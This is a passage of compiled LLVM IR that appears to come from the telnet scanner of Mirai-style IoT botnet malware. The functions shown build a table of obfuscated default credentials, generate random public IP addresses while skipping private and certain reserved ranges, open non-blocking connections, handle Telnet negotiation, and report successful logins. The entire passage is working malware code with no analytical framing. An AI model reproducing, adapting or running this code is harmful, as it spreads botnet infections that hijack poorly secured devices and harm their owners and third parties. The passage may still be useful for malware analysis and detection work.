  %923 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %922, i32 0, i32 0
  %924 = load %struct.scanner_auth*, %struct.scanner_auth** %923, align 8
  call void @report_working(i32 noundef %918, i16 noundef zeroext %921, %struct.scanner_auth* noundef %924)
  %925 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %926 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %925, i32 0, i32 1
  %927 = load i32, i32* %926, align 8
  %928 = call i32 @close(i32 noundef %927)
  %929 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %930 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %929, i32 0, i32 1
  store i32 -1, i32* %930, align 8
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 3
  store i32 0, i32* %932, align 8
  br label %933

933:                                              ; preds = %915, %912
  br label %934

934:                                              ; preds = %933, %911
  br label %936

935:                                              ; preds = %720
  store i32 0, i32* %33, align 4
  br label %936

936:                                              ; preds = %935, %934, %885, %865, %845, %825, %805, %785, %758, %731
  %937 = load i32, i32* %33, align 4
  %938 = icmp eq i32 %937, 0
  br i1 %938, label %939, label %940

939:                                              ; preds = %936
  br label %970

940:                                              ; preds = %936
  %941 = load i32, i32* %33, align 4
  %942 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %943 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %942, i32 0, i32 6
  %944 = load i32, i32* %943, align 4
  %945 = icmp sgt i32 %941, %944
  br i1 %945, label %946, label %950

946:                                              ; preds = %940
  %947 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %948 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %947, i32 0, i32 6
  %949 = load i32, i32* %948, align 4
  store i32 %949, i32* %33, align 4
  br label %950

950:                                              ; preds = %946, %940
  %951 = load i32, i32* %33, align 4
  %952 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %953 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %952, i32 0, i32 6
  %954 = load i32, i32* %953, align 4
  %955 = sub nsw i32 %954, %951
  store i32 %955, i32* %953, align 4
  %956 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %957 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %956, i32 0, i32 7
  %958 = getelementptr inbounds [256 x i8], [256 x i8]* %957, i64 0, i64 0
  %959 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %960 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %959, i32 0, i32 7
  %961 = getelementptr inbounds [256 x i8], [256 x i8]* %960, i64 0, i64 0
  %962 = load i32, i32* %33, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds i8, i8* %961, i64 %963
  %965 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %966 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %965, i32 0, i32 6
  %967 = load i32, i32* %966, align 4
  %968 = sext i32 %967 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %958, i8* align 1 %964, i64 %968, i1 false)
  br label %969

969:                                              ; preds = %950
  br label %720

970:                                              ; preds = %939
  br label %633

971:                                              ; preds = %710, %638
  br label %972

972:                                              ; preds = %971, %615
  br label %973

973:                                              ; preds = %972, %603, %566
  %974 = load i32, i32* %1, align 4
  %975 = add nsw i32 %974, 1
  store i32 %975, i32* %1, align 4
  br label %554, !llvm.loop !49

976:                                              ; preds = %554
  br label %149
}

declare void @rand_init() #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 noundef zeroext) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @add_auth_entry(i8* noundef %0, i8* noundef %1, i16 noundef zeroext %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* noundef %9, i64 noundef %13) #7
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* noundef %16, i32* noundef %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* noundef %30, i32* noundef %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

6:                                                ; preds = %225, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = and i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* %2, align 1
  %11 = load i32, i32* %1, align 4
  %12 = lshr i32 %11, 8
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %1, align 4
  %16 = lshr i32 %15, 16
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %1, align 4
  %20 = lshr i32 %19, 24
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  br label %23

23:                                               ; preds = %6
  %24 = load i8, i8* %2, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 127
  br i1 %26, label %225, label %27

27:                                               ; preds = %23
  %28 = load i8, i8* %2, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %225, label %31

31:                                               ; preds = %27
  %32 = load i8, i8* %2, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 3
  br i1 %34, label %225, label %35

35:                                               ; preds = %31
  %36 = load i8, i8* %2, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 15
  br i1 %38, label %225, label %39

39:                                               ; preds = %35
  %40 = load i8, i8* %2, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 16
  br i1 %42, label %225, label %43

43:                                               ; preds = %39
  %44 = load i8, i8* %2, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 56
  br i1 %46, label %225, label %47

47:                                               ; preds = %43
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 10
  br i1 %50, label %225, label %51

51:                                               ; preds = %47
  %52 = load i8, i8* %2, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 192
  br i1 %54, label %55, label %59

55:                                               ; preds = %51
  %56 = load i8, i8* %3, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 168
  br i1 %58, label %225, label %59

59:                                               ; preds = %55, %51
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 172
  br i1 %62, label %63, label %71

63:                                               ; preds = %59
  %64 = load i8, i8* %3, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 16
  br i1 %66, label %67, label %71

67:                                               ; preds = %63
  %68 = load i8, i8* %3, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp slt i32 %69, 32
  br i1 %70, label %225, label %71

71:                                               ; preds = %67, %63, %59
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 100
  br i1 %74, label %75, label %83

75:                                               ; preds = %71
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sge i32 %77, 64
  br i1 %78, label %79, label %83

79:                                               ; preds = %75
  %80 = load i8, i8* %3, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp slt i32 %81, 127
  br i1 %82, label %225, label %83

83:                                               ; preds = %79, %75, %71
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 169
  br i1 %86, label %87, label %91

87:                                               ; preds = %83
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp sgt i32 %89, 254
  br i1 %90, label %225, label %91

91:                                               ; preds = %87, %83
  %92 = load i8, i8* %2, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 198
  br i1 %94, label %95, label %103

95:                                               ; preds = %91
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp sge i32 %97, 18
  br i1 %98, label %99, label %103

99:                                               ; preds = %95
  %100 = load i8, i8* %3, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp slt i32 %101, 20
  br i1 %102, label %225, label %103

103:                                              ; preds = %99, %95, %91
  %104 = load i8, i8* %2, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp sge i32 %105, 224
  br i1 %106, label %225, label %107

107:                                              ; preds = %103
  %108 = load i8, i8* %2, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 106
  br i1 %110, label %111, label %115

111:                                              ; preds = %107
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 186
  br i1 %114, label %225, label %115

115:                                              ; preds = %111, %107
  %116 = load i8, i8* %2, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 106
  br i1 %118, label %119, label %123

119:                                              ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 187
  br i1 %122, label %225, label %123

123:                                              ; preds = %119, %115
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 106
  br i1 %126, label %127, label %131

127:                                              ; preds = %123
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 185
  br i1 %130, label %225, label %131

131:                                              ; preds = %127, %123
  %132 = load i8, i8* %2, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 106
  br i1 %134, label %135, label %139

135:                                              ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 184
  br i1 %138, label %225, label %139

139:                                              ; preds = %135, %131
  %140 = load i8, i8* %2, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 150
  br i1 %142, label %143, label %147

143:                                              ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 31
  br i1 %146, label %225, label %147

147:                                              ; preds = %143, %139
  %148 = load i8, i8* %2, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 49
  br i1 %150, label %151, label %155

151:                                              ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 51
  br i1 %154, label %225, label %155

155:                                              ; preds = %151, %147
  %156 = load i8, i8* %2, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 178
  br i1 %158, label %159, label %163

159:                                              ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 62
  br i1 %162, label %225, label %163

163:                                              ; preds = %159, %155
  %164 = load i8, i8* %2, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 160
  br i1 %166, label %167, label %171

167:                                              ; preds = %163
  %168 = load i8, i8* %3, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 13
  br i1 %170, label %225, label %171

171:                                              ; preds = %167, %163
  %172 = load i8, i8* %2, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 6
  br i1 %174, label %223, label %175

175:                                              ; preds = %171
  %176 = load i8, i8* %2, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 7
  br i1 %178, label %223, label %179

179:                                              ; preds = %175
  %180 = load i8, i8* %2, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 11
  br i1 %182, label %223, label %183

183:                                              ; preds = %179
  %184 = load i8, i8* %2, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 21
  br i1 %186, label %223, label %187

187:                                              ; preds = %183
  %188 = load i8, i8* %2, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 22
  br i1 %190, label %223, label %191

191:                                              ; preds = %187
  %192 = load i8, i8* %2, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 26
  br i1 %194, label %223, label %195

195:                                              ; preds = %191
  %196 = load i8, i8* %2, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 28
  br i1 %198, label %223, label %199

199:                                              ; preds = %195
  %200 = load i8, i8* %2, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 29
  br i1 %202, label %223, label %203

203:                                              ; preds = %199
  %204 = load i8, i8* %2, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 30
  br i1 %206, label %223, label %207

207:                                              ; preds = %203
  %208 = load i8, i8* %2, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 33
  br i1 %210, label %223, label %211

211:                                              ; preds = %207
  %212 = load i8, i8* %2, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 55
  br i1 %214, label %223, label %215

215:                                              ; preds = %211
  %216 = load i8, i8* %2, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 214
  br i1 %218, label %223, label %219

219:                                              ; preds = %215
  %220 = load i8, i8* %2, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 215
  br label %223

223:                                              ; preds = %219, %215, %211, %207, %203, %199, %195, %191, %187, %183, %179, %175, %171
  %224 = phi i1 [ true, %215 ], [ true, %211 ], [ true, %207 ], [ true, %203 ], [ true, %199 ], [ true, %195 ], [ true, %191 ], [ true, %187 ], [ true, %183 ], [ true, %179 ], [ true, %175 ], [ true, %171 ], [ %222, %219 ]
  br label %225

225:                                              ; preds = %223, %167, %159, %151, %143, %135, %127, %119, %111, %103, %99, %87, %79, %67, %55, %47, %43, %39, %35, %31, %27, %23
  %226 = phi i1 [ true, %167 ], [ true, %159 ], [ true, %151 ], [ true, %143 ], [ true, %135 ], [ true, %127 ], [ true, %119 ], [ true, %111 ], [ true, %103 ], [ true, %99 ], [ true, %87 ], [ true, %79 ], [ true, %67 ], [ true, %55 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ true, %35 ], [ true, %31 ], [ true, %27 ], [ true, %23 ], [ %224, %223 ]
  br i1 %226, label %6, label %227, !llvm.loop !50

227:                                              ; preds = %225
  %228 = load i8, i8* %2, align 1
  %229 = zext i8 %228 to i32
  %230 = shl i32 %229, 24
  %231 = load i8, i8* %3, align 1
  %232 = zext i8 %231 to i32
  %233 = shl i32 %232, 16
  %234 = or i32 %230, %233
  %235 = load i8, i8* %4, align 1
  %236 = zext i8 %235 to i32
  %237 = shl i32 %236, 8
  %238 = or i32 %234, %237
  %239 = load i8, i8* %5, align 1
  %240 = zext i8 %239 to i32
  %241 = shl i32 %240, 0
  %242 = or i32 %238, %241
  %243 = call i32 @htonl(i32 noundef %242) #8
  ret i32 %243
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @setup_connection(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %5, i8 0, i64 16, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

10:                                               ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 noundef %13)
  br label %15

15:                                               ; preds = %10, %1
  %16 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %15
  br label %59

21:                                               ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 0
  call void @util_zero(i8* noundef %26, i32 noundef 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 noundef %32, i32 noundef 3, i32 noundef 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 noundef %29, i32 noundef 4, i32 noundef %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 4
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 5
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @fake_time, align 4
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 2
  store i32 %46, i32* %48, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 3
  store i32 1, i32* %50, align 8
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 1
  %53 = load i32, i32* %52, align 8
  %54 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %55 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %55, %struct.sockaddr** %54, align 8
  %56 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %57 = load %struct.sockaddr*, %struct.sockaddr** %56, align 8
  %58 = call i32 @connect(i32 noundef %53, %struct.sockaddr* %57, i32 noundef 16)
  br label %59

59:                                               ; preds = %21, %20
  ret void
}

declare i32 @select(i32 noundef, %struct.fd_set.21* noundef, %struct.fd_set.21* noundef, %struct.fd_set.21* noundef, %struct.timeval.22* noundef) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

9:                                                ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %46

13:                                               ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  br label %43

25:                                               ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

36:                                               ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %47

41:                                               ; preds = %25
  br label %42

42:                                               ; preds = %41
  br label %43

43:                                               ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %2, align 4
  br label %9, !llvm.loop !51

46:                                               ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %47

47:                                               ; preds = %46, %36
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %48
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @recv_strip_null(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 noundef %11, i8* noundef %12, i64 noundef %14, i32 noundef %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

21:                                               ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

25:                                               ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %33, %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21, !llvm.loop !52

42:                                               ; preds = %21
  br label %43

43:                                               ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_iacs(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
